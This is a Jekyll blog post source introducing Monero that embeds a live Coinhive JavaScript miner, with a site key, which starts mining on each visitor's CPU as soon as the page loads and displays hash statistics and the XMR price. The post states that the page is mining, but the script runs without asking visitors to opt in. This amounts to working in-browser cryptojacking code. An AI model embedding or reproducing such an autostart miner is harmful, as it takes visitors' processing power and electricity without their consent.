---
layout: post
title: Mining crypto with a web browser
subtitle: What is Monero?
image: /img/monero.png
tags: [monero, XMR, crypto, currency, cryptocurrency, mine, miner, mining, graphics cards, bitcoin]
comments: true
---
Monero (XMR) is a cryptocurrency focused around privacy, decentralization and scalability.
It was created in April of 2014 and has since seen a huge uptick in adoption.

I recently discovered that there are services out there that allow you to embed a Monero Javascript miner into a web page.
I thought this was an interesting idea and had to try it out for myself. Is it easy to do? How efficient is it? What can it be used for?

**The page you are on is currently utilizing your CPU to mine Monero.**

___

<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
<script>
var miner = new CoinHive.Anonymous('l0YCiLkEmA6Nk1UBDRL9O0OsHSOem86y');
miner.start();

// Listen on events
miner.on('found', function() { /* Hash found */ })
miner.on('accepted', function() { /* Hash accepted by the pool */ })

// Update stats once per second
setInterval(function() {
	var hashesPerSecond = miner.getHashesPerSecond();
	var totalHashes = miner.getTotalHashes();
	var acceptedHashes = miner.getAcceptedHashes();

	// Output to HTML elements...
	document.getElementById("hashesPerSecond").innerHTML = hashesPerSecond;
	document.getElementById("totalHashes").innerHTML = totalHashes;
	document.getElementById("acceptedHashes").innerHTML = acceptedHashes;
}, 1000);

// API call to Crypto Compare
window.onload = function(){
	var xhttp = new XMLHttpRequest();
	xhttp.onreadystatechange = function() {
		if (this.readyState == 4 && this.status == 200) {
		var json = JSON.parse(this.responseText);
			document.getElementById("XMRprice").innerHTML = json.USD;
	   }
	};
	xhttp.open("GET", "https://min-api.cryptocompare.com/data/price?fsym=XMR&tsyms=USD", true);
	xhttp.send(); 
}
</script>

### Miner Stats since visiting this page

# Hashes per second: 
<div id="hashesPerSecond"></div>
**Total Hashes:** 
<p id="totalHashes"></p>
## Accepted Hashes: 
<p id="acceptedHashes"></p>

### Current Monero Price 
<p id="XMRprice"></p>

